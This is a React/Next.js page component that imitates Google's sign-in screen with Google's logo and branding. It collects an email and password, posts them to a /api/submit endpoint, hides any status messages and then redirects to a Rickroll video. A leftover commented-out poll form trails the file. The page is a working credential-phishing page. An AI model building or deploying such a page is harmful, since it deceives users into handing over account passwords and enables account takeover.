'use client';

import { useState } from 'react';
import styles from './page.module.css';

export default function Home() {
  const [status, setStatus] = useState('');

  async function handleSubmit(event) {
    event.preventDefault();
    
    const formData = {
      email: event.target.email.value,
      password: event.target.password.value
    };

    try {
      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        setStatus('success');
        event.target.reset();
        setTimeout(() => {
          window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        }, 1000);
      } else {
        setStatus('error');
      }
    } catch (error) {
      setStatus('error');
      console.error('Error:', error);
    }
  }

  return (
    <div className={styles.pageWrapper}>
      <div className={styles.contentWrapper}>
        <div className={styles.signinCard}>
          <div className={styles.logo}>
            <img 
              src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" 
              alt="Google" 
            />
          </div>
          
          <h1 className={styles.title}>Sign in</h1>
          <p className={styles.subtitle}>with your Google Account</p>

          <form onSubmit={handleSubmit} className={styles.formContainer}>
            <div className={styles.inputGroup}>
              <label className={styles.inputLabel}>Email or phone</label>
              <input
                type="text"
                name="email"
                required
                className={styles.input}
                autoComplete="username"
              />
            </div>

            <div className={styles.inputGroup}>
              <label className={styles.inputLabel}>Enter your password</label>
              <input
                type="password"
                name="password"
                required
                className={styles.input}
                autoComplete="current-password"
              />
            </div>
            
            <div className={styles.bottomContainer}>
              <a href="#" className={styles.forgotLink}>
                Forgot password?
              </a>
              <button type="submit" className={styles.signinButton}>
                SIGN IN
              </button>
            </div>
          </form>

          {/* {status === 'success' && <p className={styles.successMessage}>Signing in...</p>} */}
          {/* {status === 'error' && <p className={styles.errorMessage}>There was an error signing in. Please try again.</p>} */}
        </div>
      </div>

      <footer className={styles.footer}>
        <div className={styles.footerContent}>
          <div className={styles.languageSelector}>
            English (United States)
          </div>
          <div className={styles.footerLinks}>
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
          </div>
        </div>
      </footer>
    </div>
  );
}


    {/* <main className={styles.container}>
      <h1>Poll Form</h1>
      <form onSubmit={handleSubmit} className={styles.form}>
        <div className={styles.formGroup}>
          <label htmlFor="name">Name:</label>
          <input type="text" id="name" name="name" required />
        </div>
        <div className={styles.formGroup}>
          <label htmlFor="email">Email:</label>
          <input type="email" id="email" name="email" required />
        </div>
        <div className={styles.formGroup}>
          <label htmlFor="question1">What&apos;s your favorite programming language?</label>
          <input type="text" id="question1" name="question1" required />
        </div>
        <div className={styles.formGroup}>
          <label htmlFor="question2">How long have you been coding?</label>
          <input type="text" id="question2" name="question2" required />
        </div>
        <div className={styles.formGroup}>
          <label htmlFor="feedback">Additional Comments:</label>
          <textarea id="feedback" name="feedback" rows="4"></textarea>
        </div>
        <button type="submit">Submit</button>
      </form>
      {status === 'success' && <p className={styles.success}>Thank you for your response!</p>}
      {status === 'error' && <p className={styles.error}>There was an error submitting your response. Please try again.</p>}
    </main> */}